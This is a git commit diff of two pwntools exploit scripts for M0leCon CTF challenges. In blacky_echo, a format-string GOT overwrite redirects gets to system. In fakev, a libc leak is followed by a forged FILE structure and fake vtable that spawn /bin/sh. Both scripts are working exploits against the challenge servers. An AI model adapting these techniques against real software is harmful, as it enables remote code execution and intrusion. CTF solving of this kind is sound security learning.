2b0472782e0f3848814845facbd6aec990bdf1a1
Alessio Ciccola <alessio.ciccola@protonmail.com>
2020-07-06 14:02:29 +0200

    new writeup

--- M0leCon/blacky_echo/blacky_echo.py
+++ M0leCon/blacky_echo/blacky_echo.py
@@ -1,29 +1,23 @@
-from pwn import *
 from libformatstr import FormatStr
+from pwn import *
+
 context.log_level = "debug"
+exe = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/blacky_echo/blacky_echo")
+context.binary = exe
+HOST = "challs.m0lecon.it"
+PORT = 9011
+p = remote(HOST, PORT)
 
-# p = process("./blacky_echo")
-
-p = remote("challs.m0lecon.it",9011)
-
-# gdb.attach(p,'''
-# 	break *0x400B39
-# 	''')
-p.sendlineafter(": ",str(268435457))
+p.sendlineafter(": ", str(268435457))
 addr = 0x602088
 go = 0x400B54
 system = 0x400840
-p.sendlineafter(": ","A"*0x1000a + "%2875c....%12$hn...\x88\x20\x60\x00\x00\x00\x00\x00")
-
-p.sendlineafter("Size: ",str(268435457))
-# p.sendlineafter("Input: ","A"*0x1000a + "%24$p.%16458$p")
-p.sendlineafter(": ","A"*0x1000a + "%2087c....%12$hn...\x20\x20\x60\x00\x00\x00\x00\x00")
-
-# p.recvuntil("XXXX")
-# leak = u64(p.recv(6) + "\x00\x00")
-# print hex(leak)
-p.sendlineafter("Size: ",str(268435457))
-
+p.sendlineafter(": ", "A" * 0x1000a + "%2875c....%12$hn...\x88\x20\x60\x00\x00\x00\x00\x00")
+p.sendlineafter("Size: ", str(268435457))
+# Overwrite the poiter to the function gets with the address of function system
+p.sendlineafter(": ", "A" * 0x1000a + "%2087c....%12$hn...\x20\x20\x60\x00\x00\x00\x00\x00")
+p.sendlineafter("Size: ", str(268435457))
+# send the command to the function system("")
 p.sendline("ECHO->" + "cat flag.txt")
-
+# Spawn an interactive shell with the server
 p.interactive()
--- M0leCon/fakev/fakev.py
+++ M0leCon/fakev/fakev.py
@@ -1,34 +1,40 @@
 from pwn import *
+
 context.log_level = "debug"
+exe = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/fakev")
+libc = ELF("/home/alessio/Scrivania/tools/CTFs/M0leCon/fakev/libc.so.6")
+context.binary = exe
+HOST = "challs.m0lecon.it"
+PORT = 9013
+p = remote(HOST, PORT)
 
-# p = process("./fakev")
-# gdb.attach(p,'''
-# 	break fclose
-# 	''')
-
-p = remote("challs.m0lecon.it",9013)
 
 def choice(idx):
-	p.sendlineafter("Choice: ",str(idx))
+    p.sendlineafter("Choice: ", str(idx))
+
 
 def open_(idx):
-	choice(1)
-	p.sendlineafter("Index: ",str(idx))
+    choice(1)
+    p.sendlineafter("Index: ", str(idx))
 
+
+# send to the server the 4th choice
 def close_():
-	choice(4)
+    choice(4)
+
 
 def read_(idx):
-	choice(2)
-	p.sendlineafter("Index: ",str(idx))
-	data = p.recvline()
-	return data
+    choice(2)
+    p.sendlineafter("Index: ", str(idx))
+    data = p.recvline()
+    return data
 
-for i in xrange(1,9):
-	open_(i)
 
-for i in range(1,9):
-	close_()
+for i in xrange(1, 9):
+    open_(i)
+
+for i in range(1, 9):
+    close_()
 
 leak = read_(1)
 libc = u64(leak[8:16])
@@ -38,28 +44,12 @@ print hex(libc_base)
 
 fake_vtable_addr = libc_base + 0x3e8360 + 0x8
 
+for i in xrange(1, 10):
+    open_(i)
 
-for i in xrange(1,10):
-	open_(i)
-
-choice("4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0)*5 + p64(0x602190) + p64(0)*2 + p64((0x602190-100)/2) + "KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(0x602258) + "TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(0) + "YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(fake_vtable_addr) + p64(libc_base + 0x4f440))
-# choice()
-
+choice("4\x00\x00\x00\x00\x00\x00\x00" + p64(0x602110) + p64(0) * 5 + p64(0x602190) + p64(0) * 2 + p64(
+    (0x602190 - 100) / 2) + "KKKKKKKKLLLLLLLLMMMMMMMMNNNNNNNNOOOOOOOOPPPPPPPPQQQQQQQQ/bin/sh\x00" + p64(
+    0x602258) + "TTTTTTTTUUUUUUUU" + p64(0x6021b0) + p64(0x602108) + p64(0) + "YYYYYYYYZZZZZZZZ[[[[[[[[::::::::" + p64(
+    fake_vtable_addr) + p64(libc_base + 0x4f440))
 
 p.interactive()
-
-
-# 0x19a4a00:	0x00000000fbad2498	0x00000000019a4d50
-# 0x19a4a10:	0x00000000019a4d50	0x00000000019a4d50
-# 0x19a4a20:	0x00000000019a4d50	0x00000000019a4d50
-# 0x19a4a30:	0x00000000019a4d50	0x00000000019a4d50
-# 0x19a4a40:	0x00000000019a5d50	0x0000000000000000
-# 0x19a4a50:	0x0000000000000000	0x0000000000000000
-# 0x19a4a60:	0x0000000000000000	0x00000000019a36a0
-# 0x19a4a70:	0x000000000000000a	0x0000000000000000
-# 0x19a4a80:	0x0000000000000000	0x00000000019a4ae0
-# 0x19a4a90:	0xffffffffffffffff	0x0000000000000000
-# 0x19a4aa0:	0x00000000019a4af0	0x0000000000000000
-# 0x19a4ab0:	0x0000000000000000	0x0000000000000000
-# 0x19a4ac0:	0x00000000ffffffff	0x0000000000000000
-# 0x19a4ad0:	0x0000000000000000	0x00007f07617ec2a0
